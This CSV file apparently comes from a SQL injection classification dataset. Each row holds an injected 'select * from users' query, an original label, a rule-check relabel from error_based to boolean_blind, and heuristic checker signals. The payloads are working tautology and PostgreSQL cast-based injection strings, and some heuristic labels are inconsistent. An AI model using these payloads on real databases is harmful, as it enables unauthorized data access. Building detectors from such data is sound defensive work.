id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
40144,"select * from users WHERE username = ""1%\' ) ) ) or username = ""-1254"" and username = ""1\' ) ) ) and ( ( ( \'sbey\' = \'sbey""",error_based,generic,0.85,subquery injection pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%\' ) ) ) or username = ""-1254"" and username = ""1\' ) ) ) and ( ( ( \'sbey\' = \'sbey",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40145,"select * from users WHERE username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1""",error_based,generic,0.85,subquery injection pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-3899\' ) where 8152 = 8152 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40146,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.9,cast numeric postgresql,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40147,"select * from users WHERE username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) and ( 3530 = 3530""",error_based,postgresql,0.9,cast numeric conversion,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) and ( 3530 = 3530",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40148,"select * from users WHERE username = ""1 ) ) ) and username = ""1 ) ) ) and ( ( ( 4694 = 4694""",error_based,generic,0.85,number comparison pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1 ) ) ) and username = ""1 ) ) ) and ( ( ( 4694 = 4694",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40149,"select * from users WHERE username = ""1"" and ( ( ( 4694 = 4694"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'""",error_based,postgresql,0.9,cast numeric postgresql,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1"" and ( ( ( 4694 = 4694"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40150,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp"" and username = ""-7072\' )",error_based,postgresql,0.9,cast numeric postgresql,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp"" and username = ""-7072\' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40151,"select * from users WHERE username = ""1\' or username = ""1"" and username = ""1\' ) where 1502 = 1502",error_based,generic,0.85,subquery injection pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' or username = ""1"" and username = ""1\' ) where 1502 = 1502",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40152,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 or username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,generic,0.85,subquery injection pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 or username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40153,"select * from users WHERE username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""1 )",error_based,generic,0.85,number comparison pattern,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""1 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
